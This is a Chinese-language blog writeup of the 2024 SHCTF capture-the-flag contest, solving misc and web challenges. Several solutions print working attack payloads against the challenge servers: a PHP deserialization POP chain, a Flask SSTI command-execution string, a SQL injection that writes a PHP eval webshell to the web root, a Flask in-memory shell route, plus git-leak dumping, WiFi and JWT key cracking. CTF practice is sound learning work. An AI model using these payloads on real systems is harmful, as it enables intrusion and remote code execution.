---
title: '2024 SHCTF Writeup'
description: '根据题目描述得知是隔离区文件，尝试搜索 windows 隔离区相关内容，因为之前写过类似的，很确定是 RC4 解密'
pubDate: 2024-11-10
author: 'IHK-1'
tags: ['CTF', 'SHCTF', '2024']
---

# MISC
## WEEK1
### Quarantine
根据题目描述得知是隔离区文件，尝试搜索 windows 隔离区相关内容，因为之前写过类似的，很确定是 RC4 解密

恢复出来一句话木马

base64解密拿到一个压缩包文件，其压缩算法为 ZipCrypto，可以使用明文爆破，但是太久了，试了下 rockyou

### Rasterizing Traffic
对即可 POST 的 data 流拼接发现得到一个错误的 flag

```plain
U0hDVEZ7Q29uZ3JhdHVsQHRlX29uX1kwVV9GMW5kX3RoM193cjBuZ19hbnN3ZXJ9
SHCTF{Congratul@te_on_Y0U_F1nd_th3_wr0ng_answer}
```

对最后一个图片流分析

对图片进行光栅解密即可

```python
from PIL import Image
import numpy as np

img = np.array(Image.open(r"C:\Users\HK\Desktop\2.png"))

if img.ndim == 2:
    img = img[:, :, np.newaxis]

for i in range(5):
    z = np.zeros_like(img)
    z[:, i::5, :] = img[:, i::5, :]
    Image.fromarray(z.squeeze()).show()
```

### 拜师之旅①
010打开发现 header 缺失了 8 个字节，进行补充即可

同时图片的 crc 有问题，推测宽高有误

计算出正确宽高后，修改图片得到 flag

### 有WiFi干嘛不用呢？
根据文件名推测为 kismet 工具生成的

```plain
https://www.sec4.fun/2020/01/19/wifi-crack/
```

发现有工具可以进行解密，先写个脚本将 may 中可能的密钥提取一下

```python
import os

password_list = []
file_list = os.listdir(r"may")
for file in file_list:
    password_list.append(open(rf"may\{file}").read().strip()[1:-1])

with open('pass.txt', 'a') as f:
    for password in password_list:
        f.write(password + '\n')

```

然后使用 aircrack-ng.exe 进行爆破

```plain
aircrack-ng.exe 01.cap -w pass.txt
```

### 真真假假?遮遮掩掩!

第一个压缩包伪加密，修改 01 为 00 即可，揭开后有个掩码爆破

# WEB
## WEEK1
### 1zflask
进行路径扫描

访问 robots.txt，发现隐藏路径 s3recttt

访问拿到源码

阅读源码发现访问进行 SSHCTFF 进行命令执行即可

### jvav 
直接 ai 即可

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class demo {
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("cat /flag");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

### md5 Master

md5强碰撞 fastcoll 生成 MD5 master! 即可

### poppopop
分析 POP 链

T::__destruct --> F::__toString --> C::flag --> SHCTF::__invoke

```php
<?php
class SHCTF {
  public $isyou = "system";
  public $flag = "cat /flllag";
}

class C {
  public $p;
}

class F {
  public $o;
}

class T{
  public $n;
}

$a = new SHCTF();
$b = new C();
$b -> p = $a;
$c = new F();
$c -> o = $b;
$d = new T();
$d -> n = $c;
echo base64_encode(serialize($d));
?>
```

### 单身18年的手速
纯前端，base64解码即可

### 蛐蛐?蛐蛐!
前端页面中藏了 hint

访问拿到源码

第一个 ququ 可以使用空字符进行绕过 

第二部分直接使用了 strncmp 比较传参的 ququ 与 ququk1 前6个字符是否相同，那么想要 eval 继续执行，直接 ; 进行多个命令执行即可

### ez_gittt
直接推测 git 泄露，直接拿 githacker 梭哈

```plain
githacker --url="http://test.entry.shctf.shenghuo2.top:25875/" --output-folder='/root/Desktop/output' 

cd d23076a0402586cfc1a774e0510d7a61/.git
git log

> commit 627778f969475402df8b41562057e711e12c9b0e (HEAD -> master, ori> gin/master, origin/HEAD)
> Author: Rxuxin <l0vey0u1314@gmail.com>
> Date:   Fri Oct 4 15:27:09 2024 +0000
> 
>     Remove_flag
> 
> commit 626b40e43d6356bf3642e4fd4c57bbe7484f98d3
> Author: Rxuxin <l0vey0u1314@gmail.com>
> Date:   Fri Oct 4 15:27:09 2024 +0000
> 
>     Add_flag
> 
> commit 8dd1651ac6dc576566720781e603a606d9cea330
> Author: Rxuxin <l0vey0u1314@gmail.com>
> Date:   Fri Sep 20 16:17:05 2024 +0800
> 
>     __init__
> 

git show 627778f969475402df8b41562057e711e12c9b0e
> SHCTF{34c8f507-58d7-45c4-8ed7-529ccfce8ade}
```

## WEEK2
### 1zsql（环境错误）

### dickle（×）
查看回显发现是个 python服务器，结合题目名称的 dickle 类似 pickle 和 <font style="color:rgb(0, 0, 0);">serialized </font>，推测为 python 反序列化

尝试乱输入 >< 有个报错  Error during deserialization: Ran out of input  查询可知是 pickle.dump 错误

### guess_the_number
查看代码，发现 有一个 /s0urce 访问下载源码

分析源码，伪随机数预测

只需要遍历所有的种子即可

```python
import random

'''seed = random.randint(1000000,9999999)
    random.seed(seed)
    first_num = random.randint(1000000000,9999999999)
    second_num = random.randint(1000000000,9999999999)
'''

for i in range(1000000, 9999999):
    random.seed(i)
    if random.randint(1000000000, 9999999999) == 4977715311:
        print(i, random.randint(1000000000, 9999999999))
```

### 入侵者禁入
分析源代码，推测为 JWT 伪造，同时 render_template_string 进行 SSTI

因为其给出了 secret_key ，可以直接拿 flask-session-cookie-manager 进行伪造

修改 is_admin 为 1 ，则访问 /admin  输出 session 解码的 flag，直接 SSTI 模板注入

payload：

```plain
python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{\'\'.__class__.__base__.__subclasses__()[137].__init__.__globals__[\'popen\'](\'cat /flag\').read()}}', 'is_admin': 1}}"
```

### 登陆验证
admin admin 弱口令登入，但是提示不是真正的 admin ，推测为 JWT 绕过，使用 jwt_tool 爆破出密钥 222333

使用 jwt_tool 进行编辑

### 自助查询

直接可以进行 ") 闭合，然后试了下 into outfile 可以写入文件，但是 <?php 之类的都需要绕过，不然会写入为空，使用 16 进制 搭配 dumpfile 绕过即可

```plain
payload：
1") UNION SELECT unhex("3c3f70687020406576616c28245f504f53545b7368656c6c5d293b3f3e"), "b" INTO DUMPFILE "/var/www/html/shell.php"
```

  

## WEEK3
### hacked_website
对站点进行整体扫描，其有一个 打包泄露，

进行扫描发现有个预置后门

但是访问 /admin/profile.php 需要登入到后台

尝试了下 install.php 的反序列化，发现不行，又试了下弱口令

admin 密码为 qwer1234，分析其 webshell ，直接 POST 传参 SH 即可命令执行

### 内设
推测为 python 内存马，直接找个模板即可

```plain
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'cat /flag')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```

### 小小cms

推测为 YzmCMS v7.0 ，直接搜索相关漏洞 yzmcms-pay_callback-rce

### 顰
python 算 pin 进入 console

### 拜师之旅·番外
文件上传发现图片被重修渲染，图片重渲染文件上传

## WEEK4
### 0进制计算器（×）
尝试多次输入，发现有过滤，写一个 遍历 看下哪些字符可用

```python
import requests

url = "http://test.entry.shctf.shenghuo2.top:24919/execute"
for i in range(256):
    json = {"code": chr(i)}
    response = requests.post(url, json=json).text.strip()
    if response != "有脏东西！":
        print(chr(i))

'''
"
'
(
)
*
+
-
/
0
;
=
c
d
h
o
r
'''
```

### Json Flaw（×）

### ez_java（×）

### 可恶的骗子（环境错误）
发现老是跳转，直接扫他的站点

发现有 phpmyadmin 服务，访问之后尝试弱口令 root root 登入

### 0进制计算器 pro max（×）

